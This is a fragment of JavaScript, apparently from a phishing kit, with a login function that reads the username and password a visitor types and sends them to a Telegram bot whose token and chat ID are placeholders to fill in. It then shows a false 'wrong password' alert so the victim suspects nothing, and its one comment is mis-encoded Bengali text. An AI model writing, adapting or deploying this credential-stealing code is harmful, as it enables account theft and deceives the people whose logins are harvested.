  <script>
    function sendLogin() {
      const user = document.getElementById('username').value;
      const pass = document.getElementById('password').value;

      if (!user || !pass) {
        alert("Please fill all fields");
        return;
      }

      // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ Telegram Bot Token ‡¶è‡¶¨‡¶Ç Chat ID ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶®
      const botToken = "__TOKEN__";
      const chatId = "__CHATID__";

      const message = `üîê New Login Info:\nüë§ Username: ${user}\nüîë Password: ${pass}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
        .then(res => alert("Username and password wrong please try again!"))
        .catch(err => alert("Error sending to Telegram"));
    }
